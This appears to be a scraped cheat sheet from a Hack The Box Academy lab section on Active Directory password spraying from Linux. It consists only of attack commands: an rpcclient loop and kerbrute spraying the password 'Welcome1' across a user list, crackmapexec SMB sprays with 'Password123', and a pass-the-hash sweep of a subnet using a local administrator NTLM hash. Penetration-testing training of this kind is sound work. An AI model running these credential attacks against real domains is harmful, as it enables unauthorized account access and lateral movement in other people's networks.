# Section 11: Internal Password Spraying - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1271
- Code/command blocks: 5

> Terminal output is omitted; only commands & scripts are captured.

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" {{DC_IP}} | grep Authority; done
```

```bash
kerbrute passwordspray -d {{DOMAIN}} --dc {{DC_IP}} valid_users.txt  Welcome1
```

```bash
sudo crackmapexec smb {{DC_IP}} -u valid_users.txt -p Password123 | grep +
```

```bash
sudo crackmapexec smb {{DC_IP}} -u avazquez -p Password123
```

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

